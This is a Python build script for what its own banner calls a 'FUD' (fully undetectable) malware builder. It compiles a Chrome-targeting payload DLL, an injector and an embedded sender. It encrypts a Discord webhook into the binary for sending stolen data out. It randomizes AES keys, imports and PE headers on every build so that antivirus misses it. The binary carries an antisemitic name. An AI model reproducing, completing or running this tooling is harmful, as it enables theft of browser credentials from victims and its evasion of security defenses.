#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Build System - Generates unique binary every build
All strings AES-256-GCM encrypted, keys randomized per build, PE modified per build.
Usage: python build.py
"""

import os
import sys
import json
import shutil
import random
import string
import subprocess
import struct
from datetime import datetime
from typing import List

# Force UTF-8 output on Windows to avoid charmap codec errors from cargo output
if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    # Also set PYTHONUTF8 and PYTHONIOENCODING for child processes
    os.environ["PYTHONUTF8"] = "1"
    os.environ["PYTHONIOENCODING"] = "utf-8"

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from build_utils.strings_db import get_all_strings
from build_utils.encrypt_gen import generate_module
from build_utils.pe_modifier import post_process_pe
from build_utils.sign import sign_pe_simple
from build_utils.stealth_gen import generate_stealth_tables
from build_utils.import_injector import inject_legitimate_imports
from build_utils.polymorphic_gen import generate_polymorphic_keys

# ===== CONFIGURATION =====
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
ENCRYPTED_RS = os.path.join(PROJECT_ROOT, "src", "encrypted.rs")
STEALTH_RS = os.path.join(PROJECT_ROOT, "src", "inject", "src", "stealth_tables.rs")
POLYMORPHIC_RS = os.path.join(PROJECT_ROOT, "src", "polymorphic_keys.rs")
POLYMORPHIC_INJECT_RS = os.path.join(PROJECT_ROOT, "src", "inject", "src", "polymorphic_keys.rs")
RELEASE_DIR = os.path.join(PROJECT_ROOT, "release")

# On Linux, cross-compile for Windows; on Windows build natively
import platform as _platform

def _detect_nightly_toolchain():
    """Return the best available nightly toolchain name.

    On Windows: prefer MSVC variant (no GCC/dlltool needed).
    On Linux:   prefer any nightly (will cross-compile to windows-gnu).
    """
    try:
        out = subprocess.check_output(
            ["rustup", "toolchain", "list"], text=True,
            encoding="utf-8", errors="replace", stderr=subprocess.DEVNULL
        )
        lines = [l.split()[0] for l in out.splitlines() if l.split()]
        if _platform.system() == "Windows":
            # Prefer MSVC nightly — no GCC or dlltool required
            for tok in lines:
                if tok.startswith("nightly") and "msvc" in tok:
                    return tok
            # Fall back to any nightly (will be msvc if default host is msvc)
            for tok in lines:
                if tok.startswith("nightly"):
                    return tok
        else:
            for tok in lines:
                if tok.startswith("nightly"):
                    return tok
    except Exception:
        pass
    return "nightly"

_NIGHTLY = _detect_nightly_toolchain()

if _platform.system() == "Windows":
    # Build natively on Windows — no cross-compilation, no --target needed.
    # MSVC toolchain handles everything without GCC or dlltool.
    _CARGO_EXTRA = []
    _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "release")
else:
    # On Linux: cross-compile to Windows GNU target, recompile stdlib for
    # maximum path stripping (dlltool is available via mingw-w64 package).
    _CARGO_EXTRA = ["--target", "x86_64-pc-windows-gnu", "-Z", "build-std=std,panic_abort"]
    _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "x86_64-pc-windows-gnu", "release")

TARGET_EXE = os.path.join(_TARGET_REL, "jewish.exe")
TARGET_SENDER = os.path.join(_TARGET_REL, "sender.exe")
TARGET_DLL = os.path.join(_TARGET_REL, "chrome_payload.dll")


# ===== TOOLCHAIN SETUP =====

def ensure_nightly_toolchain():
    """Install the best nightly toolchain and return its name.

    Windows → nightly-x86_64-pc-windows-msvc  (MSVC, no GCC/dlltool needed)
    Linux   → nightly  (cross-compiles to windows-gnu via mingw-w64)
    """
    global _NIGHTLY

    if _platform.system() == "Windows":
        preferred = "nightly-x86_64-pc-windows-msvc"
    else:
        preferred = "nightly"

    # Try detected toolchain first, then preferred
    for candidate in dict.fromkeys([_NIGHTLY, preferred]):  # deduplicated, ordered
        try:
            result = subprocess.run(
                ["rustup", "run", candidate, "rustc", "--version"],
                capture_output=True, text=True, encoding="utf-8", errors="replace"
            )
            if result.returncode == 0:
                _NIGHTLY = candidate
                # rust-src needed on Linux for -Z build-std
                if _platform.system() != "Windows":
                    subprocess.run(
                        ["rustup", "component", "add", "rust-src", "--toolchain", candidate],
                        capture_output=True
                    )
                return _NIGHTLY
        except Exception:
            pass

    print(f"[*] Installing nightly toolchain ({preferred})...")
    components = ["rust-src"] if _platform.system() != "Windows" else []
    cmd = ["rustup", "toolchain", "install", preferred]
    for c in components:
        cmd += ["--component", c]
    subprocess.run(cmd, check=True)
    _NIGHTLY = preferred
    return _NIGHTLY


def setup_mingw_path():
    """No-op on Windows MSVC (no MinGW needed). Sets up config on Linux."""
    if _platform.system() == "Windows":
        # MSVC toolchain handles everything natively — nothing to do
        return
    # On Linux ensure the config.toml linker is set for cross-compilation
    _write_cargo_config(None, None)


def _clean_stale_cargo_config():
    """Remove .cargo/config.toml if it contains invalid dlltool syntax from old build scripts."""
    config_path = os.path.join(PROJECT_ROOT, ".cargo", "config.toml")
    if not os.path.exists(config_path):
        return
    try:
        with open(config_path, "r", encoding="utf-8") as f:
            content = f.read()
        # Old buggy versions wrote [target.xxx.dlltool] as a table header — invalid
        if "[target.x86_64-pc-windows-gnu.dlltool]" in content:
            os.remove(config_path)
            print("[*] Removed stale .cargo/config.toml (invalid dlltool syntax)")
    except Exception:
        pass


def _write_cargo_config(gcc, ar):
    """Keep .cargo/config.toml correct for the current platform."""
    config_path = os.path.join(PROJECT_ROOT, ".cargo", "config.toml")
    # On Windows MSVC we don't need a custom linker — leave the file as-is
    if _platform.system() == "Windows":
        return
    # On Linux: ensure cross-compilation linker is set
    content = "[target.x86_64-pc-windows-gnu]\nlinker = \"x86_64-w64-mingw32-gcc\"\nar = \"x86_64-w64-mingw32-ar\"\n"
    existing = ""
    if os.path.exists(config_path):
        with open(config_path, "r", encoding="utf-8") as f:
            existing = f.read()
    if existing != content:
        with open(config_path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"[+] Updated .cargo/config.toml")


# ===== UTILITY FUNCTIONS =====

def generate_random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_prefix(length=3):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def generate_random_suffix():
    return random.randint(1000, 9999)


# ===== BUILD COMMANDS =====

def run_command(cmd: List[str], description: str, extra_env: dict = None) -> bool:
    print(f"[*] {description}...")
    try:
        cmd_env = {**os.environ}
        if extra_env:
            cmd_env.update(extra_env)
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
            bufsize=1,
            cwd=PROJECT_ROOT,
            env=cmd_env
        )
        for line in process.stdout:
            if line.strip():
                print(line.rstrip())
        process.wait()
        if process.returncode != 0:
            print(f"[!] {description} FAILED (code {process.returncode})")
            return False
        print(f"[+] {description} OK")
        return True
    except Exception as e:
        print(f"[!] Exception in {description}: {e}")
        return False


# ===== MAIN =====

def main():
    print("=" * 60)
    print("   FUD Build System - Jewish Builder v2")
    print("   Every build is a unique variant")
    print("=" * 60)

    # Load webhook from config.json or prompt
    config_path = os.path.join(PROJECT_ROOT, "config.json")
    webhook = None
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
                webhook = cfg.get("webhook", "").strip()
        except Exception as e:
            print(f"[!] Failed to read config.json: {e}")

    if not webhook:
        webhook = input("\nEnter Discord webhook URL: ").strip()
        if not webhook:
            print("[!] No webhook provided.")
            sys.exit(1)

    # Ensure nightly toolchain is available before building
    print("\n[*] Checking nightly toolchain...")
    ensure_nightly_toolchain()
    print(f"[+] Using toolchain: {_NIGHTLY}")
    # Remove any stale .cargo/config.toml that may have been written by a
    # previous buggy version of this script (with invalid dlltool table syntax).
    _clean_stale_cargo_config()
    setup_mingw_path()

    # Generate random parameters
    prefix = generate_random_prefix()
    suffix = generate_random_suffix()
    random_name = generate_random_name()

    print(f"\n[+] Build parameters:")
    print(f"    Prefix: {prefix}")
    print(f"    Suffix: {suffix}")
    print(f"    Output: {random_name}.exe")

    # Step 1: Generate encrypted.rs with all strings + webhook
    print("\n===== 1/7 Generating encrypted strings =====")
    strings = get_all_strings()
    generate_module(
        strings=strings,
        output_path=ENCRYPTED_RS,
        include_webhook=True,
        webhook_url=webhook
    )
    if not os.path.exists(ENCRYPTED_RS):
        print("[!] Failed to generate encrypted.rs")
        sys.exit(1)
    print(f"[+] Generated {ENCRYPTED_RS} ({os.path.getsize(ENCRYPTED_RS)} bytes)")

    # Step 1b: Generate per-build stealth decryption tables (unique AES-256-GCM keys per DLL/export name)
    print("\n[*] Generating stealth tables...")
    generate_stealth_tables(STEALTH_RS)
    if not os.path.exists(STEALTH_RS):
        print("[!] Failed to generate stealth_tables.rs")
        sys.exit(1)
    print(f"[+] Generated {STEALTH_RS}")

    # Step 1c: Generate polymorphic AES-256-GCM keys for kill.rs, lib.rs, api.rs
    print("\n[*] Generating polymorphic AES keys...")
    generate_polymorphic_keys(os.path.join(PROJECT_ROOT, "src"))
    if not os.path.exists(POLYMORPHIC_RS):
        print("[!] Failed to generate polymorphic_keys.rs")
        sys.exit(1)
    print(f"[+] Generated {POLYMORPHIC_RS}")

    # Step 2: Set environment variables for build.rs
    os.environ["COMPILE_PREFIX"] = prefix
    os.environ["COMPILE_SUFFIX"] = str(suffix)

    _home       = os.path.expanduser("~")
    _cargo_home = os.environ.get("CARGO_HOME", os.path.join(_home, ".cargo"))
    # rustc on Windows accepts both / and \ in remap paths; use forward slashes
    # so the same flags work cross-platform.
    def _fwd(p): return p.replace("\\", "/")

    _pr  = _fwd(PROJECT_ROOT)
    _hm  = _fwd(_home)
    _ch  = _fwd(_cargo_home)

    _remap_flags = [
        f"--remap-path-prefix={_pr}/src/inject/src=i",
        f"--remap-path-prefix={_pr}/src/payload/src=p",
        f"--remap-path-prefix={_pr}/src=s",
        f"--remap-path-prefix={_pr}=b",
        f"--remap-path-prefix={_hm}=h",
        f"--remap-path-prefix={_ch}=c",
        "--remap-path-prefix=/usr/local/cargo=c",
        "--remap-path-prefix=/root/.cargo=c",
        "--remap-path-prefix=/rust/deps=c",
        "--remap-path-prefix=/rustc=r",
        "--remap-path-prefix=.=b",
        "--remap-path-prefix=src=s",
        "-C debuginfo=0",
        "-C force-frame-pointers=n",
        "-Z location-detail=none",
        "-Z unstable-options",
    ]
    # Note: getrandom_backend="windows_legacy" was needed for GNU toolchain only.
    # MSVC toolchain handles Windows APIs natively without dlltool.
    _remap = " ".join(_remap_flags)
    # Merge with any flags already set (e.g. -C dlltool= added by setup_mingw_path)
    os.environ["RUSTFLAGS"] = (os.environ.get("RUSTFLAGS", "") + " " + _remap).strip()

    # Step 3: Build payload DLL (64-bit)
    print("\n===== 2/7 Building Payload DLLs =====")
    _cargo_cmd = ["rustup", "run", _NIGHTLY, "cargo"]
    if not run_command(_cargo_cmd + ["build", "--release", "-p", "chrome-payload"] + _CARGO_EXTRA, "Building chrome_payload.dll (64-bit)"):
        print("[!] Payload build failed - aborting")
        sys.exit(1)
    if not os.path.exists(TARGET_DLL):
        print(f"[!] DLL not produced at {TARGET_DLL}")
        sys.exit(1)
    dll_size = os.path.getsize(TARGET_DLL)
    print(f"[+] DLL (64-bit) size: {dll_size} bytes")

    # Step 3b: Build embedded sender (network delivery only)
    print("\n===== 2b/7 Building sender.exe =====")
    if not run_command(
        _cargo_cmd + ["build", "--release", "--bin", "sender"] + _CARGO_EXTRA,
        "Building sender.exe",
        extra_env={"SKIP_SENDER_EMBED": "1"},
    ):
        print("[!] Sender build failed - aborting")
        sys.exit(1)
    if not os.path.exists(TARGET_SENDER):
        print(f"[!] Sender not produced at {TARGET_SENDER}")
        sys.exit(1)
    sender_size = os.path.getsize(TARGET_SENDER)
    print(f"[+] Sender size: {sender_size} bytes")

    # Step 4: Build main executable (embed sender built above — --bin jewish only)
    print("\n===== 3/7 Building jewish.exe =====")
    env = {
        **os.environ,
        "SENDER_EXE": os.path.abspath(TARGET_SENDER),
    }
    env.pop("SKIP_SENDER_EMBED", None)
    embed_ok = False
    try:
        process = subprocess.Popen(
            ["rustup", "run", _NIGHTLY, "cargo", "build", "--release", "--bin", "jewish"] + _CARGO_EXTRA,
            cwd=PROJECT_ROOT, env=env,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, encoding="utf-8", errors="replace", bufsize=1
        )
        for line in process.stdout:
            print(line, end="")
            if "embedded sender (deflate+AES-256-GCM)" in line:
                embed_ok = True
            if "sender.exe not found" in line and "inline fallback" in line:
                embed_ok = False
        if process.wait() != 0:
            print("[!] Main build failed - aborting")
            sys.exit(1)
        if not embed_ok:
            print("[!] WARNING: sender.exe was NOT embedded in jewish.exe (inline fallback only)")
            print(f"    Expected sender at: {env.get('SENDER_EXE')}")
        else:
            print(f"[+] Sender embedded from {env.get('SENDER_EXE')}")
    except Exception as e:
        print(f"[!] Build error: {e}")
        sys.exit(1)

    # Step 5: PE camouflation (full LIEF modifications + light header patch)
    print("\n===== 4/7 PE camouflation =====")
    if os.path.exists(TARGET_EXE):
        # Full PE post-processing: section randomization, garbage section, header
        # randomization, entropy normalization, overlay, etc.
        try:
            post_process_pe(TARGET_EXE)
        except Exception as e:
            print(f"[!] post_process_pe failed: {e}")
        # Light header patch as additional pass (timestamp + debug dir)
        try:
            from build_utils.camouflage import camouflage_pe
            camouflage_pe(TARGET_EXE)
        except Exception as e:
            print(f"[!] Camouflage failed: {e}")
    else:
        print(f"[!] {TARGET_EXE} not found for post-processing")

    # Step 6: Copy to release
    print("\n===== 5/7 Copying to release =====")
    if not os.path.exists(TARGET_EXE):
        print(f"[!] {TARGET_EXE} not found!")
        sys.exit(1)

    if not os.path.exists(RELEASE_DIR):
        os.makedirs(RELEASE_DIR)

    # Clean release/ — keep only one binary at a time
    removed = 0
    for entry in os.listdir(RELEASE_DIR):
        entry_path = os.path.join(RELEASE_DIR, entry)
        if os.path.isfile(entry_path):
            try:
                os.remove(entry_path)
                removed += 1
            except OSError as e:
                print(f"[!] Could not remove {entry}: {e}")
    if removed:
        print(f"[*] Cleaned {removed} old file(s) from release/")

    dst_exe = os.path.join(RELEASE_DIR, f"{random_name}.exe")
    dst_info = os.path.join(RELEASE_DIR, f"{random_name}.info")

    shutil.copy2(TARGET_EXE, dst_exe)
    size = os.path.getsize(dst_exe)

    with open(dst_info, 'w', encoding='utf-8') as f:
        f.write(f"Build: {random_name}\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Webhook: AES-256-GCM encrypted\n")
        f.write(f"Prefix: {prefix}\n")
        f.write(f"Suffix: {suffix}\n")
        f.write(f"File size: {size} bytes\n")
        f.write(f"Original binary: jewish.exe\n")

    print(f"[+] Binary copied to {dst_exe} ({size} bytes)")
    print(f"[+] Build info saved to {dst_info}")

    # Step 7: Clean up build artifacts
    print("\n===== 6/7 Cleaning build artifacts =====")
    target_dir = os.path.join(PROJECT_ROOT, "target")
    if os.path.exists(target_dir):
        try:
            # On Windows, files may still be locked by antivirus / file handles.
            # Retry several times with a short delay before giving up.
            for attempt in range(5):
                try:
                    shutil.rmtree(target_dir)
                    print(f"[+] Removed {target_dir}")
                    break
                except OSError:
                    if attempt < 4:
                        import time
                        time.sleep(0.5)
                    else:
                        # Last attempt: try removing file by file
                        removed = 0
                        for root, dirs, files in os.walk(target_dir, topdown=False):
                            for f in files:
                                try:
                                    os.remove(os.path.join(root, f))
                                    removed += 1
                                except OSError:
                                    pass
                            for d in dirs:
                                try:
                                    os.rmdir(os.path.join(root, d))
                                except OSError:
                                    pass
                        try:
                            os.rmdir(target_dir)
                            print(f"[+] Removed {target_dir} (after {removed} file(s) cleaned)")
                        except OSError as e:
                            print(f"[!] Warning: could not fully remove target/: {e}")
        except Exception as e:
            print(f"[!] Warning: could not fully remove target/: {e}")

    # Step 7b: Clean up generated files (regenerated each build)
    for gen_file in [ENCRYPTED_RS, STEALTH_RS, POLYMORPHIC_RS, POLYMORPHIC_INJECT_RS]:
        if os.path.exists(gen_file):
            try:
                os.remove(gen_file)
                print(f"[+] Removed {gen_file}")
            except Exception as e:
                print(f"[!] Could not remove {gen_file}: {e}")

    print("\n" + "=" * 60)
    print(f"   7/7 BUILD COMPLETE: release/{random_name}.exe")
    print("=" * 60)


if __name__ == "__main__":
    main()

